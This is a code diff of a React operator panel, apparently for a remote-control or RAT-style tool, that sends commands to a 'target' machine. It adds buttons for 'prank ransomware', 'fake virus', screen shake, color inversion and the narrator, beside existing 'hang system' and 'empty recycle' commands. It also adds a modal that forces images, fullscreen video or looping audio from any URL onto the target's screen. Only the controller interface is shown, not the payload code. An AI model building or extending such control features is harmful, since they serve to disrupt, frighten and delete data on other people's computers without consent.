@@ -78,6 +78,14 @@ const HDexPage: React.FC = () => {
 
   // Input Modal
   const [inputModal, setInputModal] = useState<{ open: boolean; command: string; label: string; placeholder: string } | null>(null);
+  const [mediaModal, setMediaModal] = useState(false);
+  const [mediaUrl, setMediaUrl] = useState('');
+  const [mediaType, setMediaType] = useState<'image' | 'video' | 'audio'>('image');
+  const [mediaDuration, setMediaDuration] = useState(10);
+  const [mediaScale, setMediaScale] = useState(100);
+  const [mediaVolume, setMediaVolume] = useState(100);
+  const [mediaLoop, setMediaLoop] = useState(false);
+  const [mediaFullscreen, setMediaFullscreen] = useState(true);
   const [inputValue, setInputValue] = useState('');
 
   // File Manager State
@@ -377,6 +385,12 @@ const HDexPage: React.FC = () => {
     { label: 'HANG SYSTEM', type: 'hang_system', icon: AlertCircle, color: '#ef4444', danger: true },
     { label: 'MATRIX', type: 'ultra_matrix', icon: Terminal, color: '#22c55e', danger: true },
     { label: 'EMPTY RECYCLE', type: 'empty_recycle', icon: Trash2, color: '#ef4444', danger: true },
+    { label: 'RANSOMWARE', type: 'prank_ransomware', icon: Skull, color: '#dc2626', danger: true },
+    { label: 'INVERT COLORS', type: 'invert_colors', icon: Sun, color: '#a855f7' },
+    { label: 'NARRATOR', type: 'toggle_narrator', icon: Volume2, color: '#f59e0b' },
+    { label: 'SCREEN SHAKE', type: 'screen_shake', icon: Zap, color: '#f43f5e', danger: true },
+    { label: 'FAKE VIRUS', type: 'fake_virus', icon: ShieldX, color: '#dc2626', danger: true },
+    { label: 'SHOW MEDIA', type: 'show_media_btn', icon: Monitor, color: '#8b5cf6' },
   ];
 
   const defenseCmds = [
@@ -430,7 +444,8 @@ const HDexPage: React.FC = () => {
   const renderModuleButton = (cmd: any) => {
     const isInput = cmd.type === 'input';
     const handleClick = () => {
-      if (isInput) setInputModal({ open: true, ...cmd.input });
+      if (cmd.type === 'show_media_btn') setMediaModal(true);
+      else if (isInput) setInputModal({ open: true, ...cmd.input });
       else sendCommand(cmd.type, cmd.data || {});
     };
     return (
@@ -874,6 +889,71 @@ const HDexPage: React.FC = () => {
               <div style={{ display: 'flex', gap: '1rem', marginTop: '2rem' }}>
                 <button onClick={submitCommandInput} className="btn" style={{ flex: 1, borderColor: accentColor, color: accentColor }}>SEND</button>
                 <button onClick={() => setInputModal(null)} className="btn" style={{ flex: 1, background: '#111' }}>CANCEL</button>
+              </div>
+            </motion.div>
+          </div>
+        )}
+      </AnimatePresence>
+
+      {/* MEDIA URL MODAL */}
+      <AnimatePresence>
+        {mediaModal && (
+          <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.92)', zIndex: 3000, display: 'flex', alignItems: 'center', justifyContent: 'center', backdropFilter: 'blur(10px)' }}>
+            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }}
+              className="card" style={{ width: '520px', padding: '2rem', border: `1px solid ${accentColor}` }}>
+              <h3 style={{ fontSize: '0.8rem', letterSpacing: '3px', marginBottom: '1.5rem', fontFamily: 'monospace', color: accentColor }}>SHOW MEDIA ON TARGET</h3>
+
+              <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '1.5rem' }}>
+                {['image', 'video', 'audio'].map(t => (
+                  <button key={t} onClick={() => setMediaType(t as any)}
+                    style={{ flex: 1, padding: '0.6rem', background: mediaType === t ? accentColor : '#111', color: mediaType === t ? '#000' : '#888', border: 'none', borderRadius: '4px', cursor: 'pointer', textTransform: 'uppercase', fontSize: '0.6rem', letterSpacing: '2px', fontWeight: 'bold' }}>
+                    {t}
+                  </button>
+                ))}
+              </div>
+
+              <input autoFocus type="text" value={mediaUrl} onChange={e => setMediaUrl(e.target.value)}
+                placeholder="https://example.com/image.png"
+                style={{ width: '100%', padding: '0.8rem', background: '#000', border: '1px solid #333', color: '#fff', fontSize: '0.75rem', fontFamily: 'monospace', marginBottom: '1rem' }} />
+
+              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1rem', marginBottom: '1.5rem' }}>
+                {mediaType === 'image' && <>
+                  <div><label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.3rem' }}>DURATION (sec)</label>
+                    <input type="number" value={mediaDuration} onChange={e => setMediaDuration(Number(e.target.value))} min={1} max={300}
+                      style={{ width: '100%', padding: '0.5rem', background: '#000', border: '1px solid #222', color: '#fff', fontSize: '0.7rem' }} /></div>
+                  <div><label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.3rem' }}>SCALE (%)</label>
+                    <input type="number" value={mediaScale} onChange={e => setMediaScale(Number(e.target.value))} min={10} max={200}
+                      style={{ width: '100%', padding: '0.5rem', background: '#000', border: '1px solid #222', color: '#fff', fontSize: '0.7rem' }} /></div>
+                </>}
+                {mediaType === 'video' && <>
+                  <div><label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.3rem' }}>FULLSCREEN</label>
+                    <select value={mediaFullscreen ? 'yes' : 'no'} onChange={e => setMediaFullscreen(e.target.value === 'yes')}
+                      style={{ width: '100%', padding: '0.5rem', background: '#000', border: '1px solid #222', color: '#fff', fontSize: '0.7rem' }}>
+                      <option value="yes">Yes</option><option value="no">No</option></select></div>
+                </>}
+                {mediaType === 'audio' && <>
+                  <div><label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.3rem' }}>VOLUME (0-100)</label>
+                    <input type="number" value={mediaVolume} onChange={e => setMediaVolume(Number(e.target.value))} min={0} max={100}
+                      style={{ width: '100%', padding: '0.5rem', background: '#000', border: '1px solid #222', color: '#fff', fontSize: '0.7rem' }} /></div>
+                  <div><label style={{ fontSize: '0.5rem', color: '#555', display: 'block', marginBottom: '0.3rem' }}>LOOP</label>
+                    <select value={mediaLoop ? 'yes' : 'no'} onChange={e => setMediaLoop(e.target.value === 'yes')}
+                      style={{ width: '100%', padding: '0.5rem', background: '#000', border: '1px solid #222', color: '#fff', fontSize: '0.7rem' }}>
+                      <option value="yes">Yes</option><option value="no">No</option></select></div>
+                </>}
+              </div>
+
+              <div style={{ display: 'flex', gap: '1rem' }}>
+                <button onClick={() => {
+                  if (!mediaUrl) return;
+                  const cmd = mediaType === 'image' ? 'show_image_url' : mediaType === 'video' ? 'play_video_url' : 'play_audio_url';
+                  const data: any = { url: mediaUrl };
+                  if (mediaType === 'image') { data.duration = mediaDuration; data.scale = mediaScale; }
+                  if (mediaType === 'video') data.fullscreen = mediaFullscreen;
+                  if (mediaType === 'audio') { data.volume = mediaVolume; data.loop = mediaLoop; }
+                  sendCommand(cmd, data);
+                  setMediaModal(false);
+                }} className="btn" style={{ flex: 1, borderColor: accentColor, color: accentColor }}>SEND</button>
+                <button onClick={() => setMediaModal(false)} className="btn" style={{ flex: 1, background: '#111' }}>CANCEL</button>
               </div>
             </motion.div>
           </div>
